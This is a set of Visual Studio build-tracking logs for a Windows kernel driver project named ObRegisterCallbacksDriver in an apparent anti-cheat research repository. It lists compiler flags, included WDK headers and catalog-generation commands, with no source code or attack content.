/c /IX64\DEBUG\ /Zi /nologo /W4 /WX /diagnostics:classic /Od /Oi /Oy- /D _WIN64 /D _AMD64_ /D AMD64 /D DEPRECATE_DDK_FUNCTIONS=1 /D MSC_NOOPT /D _WIN32_WINNT=0x0A00 /D WINVER=0x0A00 /D WINNT=1 /D NTDDI_VERSION=0x0A000005 /D DBG=1 /D KMDF_VERSION_MAJOR=1 /D KMDF_VERSION_MINOR=15 /GF /Gm- /Zp8 /GS /guard:cf /Gy /fp:precise /Zc:wchar_t- /Zc:forScope /Zc:inline /GR- /Fo"X64\DEBUG\\" /Fd"X64\DEBUG\VC141.PDB" /Gz /wd4748 /wd4603 /wd4627 /wd4986 /wd4987 /wd4996 /FI"C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WARNING.H" /FC /kernel -cbstring -d2epilogunwind /d1import_no_registry /d2AllowCompatibleILVersions /d2Zi+ /Qspectre  C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.CPP
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C
/c /IX64\DEBUG\ /Zi /nologo /W4 /WX /diagnostics:classic /Od /Oi /Oy- /D _WIN64 /D _AMD64_ /D AMD64 /D DEPRECATE_DDK_FUNCTIONS=1 /D MSC_NOOPT /D _WIN32_WINNT=0x0A00 /D WINVER=0x0A00 /D WINNT=1 /D NTDDI_VERSION=0x0A000005 /D DBG=1 /D KMDF_VERSION_MAJOR=1 /D KMDF_VERSION_MINOR=15 /GF /Gm- /Zp8 /GS /guard:cf /Gy /fp:precise /Zc:wchar_t- /Zc:forScope /Zc:inline /GR- /Fo"X64\DEBUG\\" /Fd"X64\DEBUG\VC141.PDB" /Gz /wd4748 /wd4603 /wd4627 /wd4986 /wd4987 /wd4996 /FI"C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WARNING.H" /FC /kernel -cbstring -d2epilogunwind /d1import_no_registry /d2AllowCompatibleILVersions /d2Zi+ /Qspectre  C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/CL.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C
C:\PROGRAM FILES (X86)\MICROSOFT VISUAL STUDIO\2017\PROFESSIONAL\VC\TOOLS\MSVC\14.14.26428\BIN\HOSTX86\X64\1033\CLUI.DLL
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WARNING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SUPPRESS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\NTDDK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\WDM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\EXCPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\CRTDEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\CONCURRENCYSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\VADEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\NTDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\CRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\NTSTATUS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\BUGCODES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\NTIOLOGC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\MCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\DPFILTER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\EVNTPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\SHARED\DEVPROPDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFGLOBALS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFFUNCENUM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFSTATUS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFASSERT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFVERIFIER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFOBJECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFSYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCORE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDRIVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFQUERYINTERFACE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFMEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCHILDLIST.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFFILEOBJECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDEVICE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.17134.0\KM\WDMSEC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCOLLECTION.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFTIMER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFWORKITEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFINTERRUPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFRESOURCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFREQUEST.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFIOTARGET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFFDO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFPDO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCONTROL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFWMI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFREGISTRY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDMAENABLER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFDMATRANSACTION.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFCOMMONBUFFER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFBUGCODES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFROLETYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\WDF\KMDF\1.15\WDFHWACCESS.H
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.H

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/CL.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\DRIVER.C
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\VC141.PDB
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/Inf2Cat.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
/os:10_x64 /driver:C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver\ /driver: /os:10_x64 C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/ObRegisterCallbacksDriver.lastbuildstate`:

```lastbuildstate
#TargetFrameworkVersion=v4.5:PlatformToolSet=WindowsKernelModeDriver10.0:EnableManagedIncrementalBuild=false:VCToolArchitecture=Native32Bit:WindowsTargetPlatformVersion=10.0.17134.0
Debug|x64|C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\|

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.12948.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\65d4d171-a228-449c-b6ec-8405be0ce428\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.12948.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\65d4d171-a228-449c-b6ec-8405be0ce428\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.13540.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\452a629e-4a9b-465f-9175-fa9eb691e184\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.13540.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\452a629e-4a9b-465f-9175-fa9eb691e184\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.3956.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\65d4d171-a228-449c-b6ec-8405be0ce428\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.3956.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\65d4d171-a228-449c-b6ec-8405be0ce428\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.7088.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\673fd427-0941-4575-b88f-479bf89308ac\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.7088.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\673fd427-0941-4575-b88f-479bf89308ac\001"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.7348.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\452a629e-4a9b-465f-9175-fa9eb691e184\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.7348.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.sys" "C:\Users\marius\AppData\Local\Temp\WST\452a629e-4a9b-465f-9175-fa9eb691e184\002"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.read.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\673fd427-0941-4575-b88f-479bf89308ac\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\65d4d171-a228-449c-b6ec-8405be0ce428\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\452a629e-4a9b-465f-9175-fa9eb691e184\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat-expand.write.1.tlog`:

```tlog
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.inf" "C:\Users\marius\AppData\Local\Temp\WST\673fd427-0941-4575-b88f-479bf89308ac\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\65d4d171-a228-449c-b6ec-8405be0ce428\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
#Command: "C:\WINDOWS\system32\expand.exe" "c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\x64\debug\obregistercallbacksdriver\obregistercallbacksdriver.cat" "C:\Users\marius\AppData\Local\Temp\WST\452a629e-4a9b-465f-9175-fa9eb691e184\000"
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\WINDOWS\MICROSOFT.NET\FRAMEWORK64\V2.0.50727\MSCORWKS.DLL
C:\WINDOWS\MICROSOFT.NET\FRAMEWORK64\V4.0.30319\CLR.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\INF2CAT.EXE
C:\WINDOWS\MICROSOFT.NET\FRAMEWORK64\V4.0.30319\CONFIG\MACHINE.CONFIG
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\MSCORLIB\649C6A53D1A3A182E6EAC793694A733F\MSCORLIB.NI.DLL.AUX
C:\WINDOWS\ASSEMBLY\PUBPOL36.DAT
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.SUBMISSIONBUILDER.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.CATALOGS.DLL
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\SYSTEM\7E7BA461137D6FAF674666F208BB34C2\SYSTEM.NI.DLL.AUX
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\SYSTEM.CORE\6A9FE8D059FF70ADB50F5B340A4AD8EE\SYSTEM.CORE.NI.DLL.AUX
C:\WINDOWS\ASSEMBLY\NATIVEIMAGES_V4.0.30319_64\SYSTEM.XML\08E8FA67F0A711551A8A00AD6C5880FC\SYSTEM.XML.NI.DLL.AUX
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.CABINETS.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\MICROSOFT.UNIVERSALSTORE.HARDWAREWORKFLOW.INFREADER.DLL
